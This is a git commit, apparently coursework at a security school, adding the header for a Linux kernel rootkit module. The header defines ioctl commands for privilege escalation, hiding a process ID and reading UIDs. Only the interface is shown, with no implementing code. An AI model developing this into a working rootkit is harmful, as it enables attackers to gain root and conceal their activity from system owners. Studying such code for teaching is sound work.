ed73a9397dd5395e9b291be996ba4323b010806b
alberick.mahoussi <alberick.mahoussi@ecole2600.com>
2026-03-24 14:16:17 +0100

    [ADD] init of lkm rootkit module

---
+++ rootkit_module/rootkit.h
@@ -0,0 +1,26 @@
+#ifndef RK_PROTO_H
+#define RK_PROTO_H
+
+#include <linux/ioctl.h>
+
+#define RK_MAGIC 0xDE
+
+/* Structure d'arguments passee a chaque commande */
+struct rk_args {
+    unsigned int target;   /* PID, UID, ou autre identifiant */
+    unsigned int value;    /* parametre supplementaire selon la commande */
+};
+
+/* Definition des commandes ioctl
+ *   _IOW  = userspace ecrit vers le noyau  (write)
+ *   _IOR  = noyau ecrit vers userspace     (read)
+ *   _IOWR = les deux
+ *
+ *   Arguments : magic, numero de commande, type de la structure
+ */
+#define RK_CMD_HELLO    _IO  (RK_MAGIC, 0)
+#define RK_CMD_PRIVESC  _IOW (RK_MAGIC, 1, struct rk_args)
+#define RK_CMD_HIDE_PID _IOW (RK_MAGIC, 2, struct rk_args)
+#define RK_CMD_GETUID   _IOR (RK_MAGIC, 3, struct rk_args)
+
+#endif /* RK_PROTO_H */
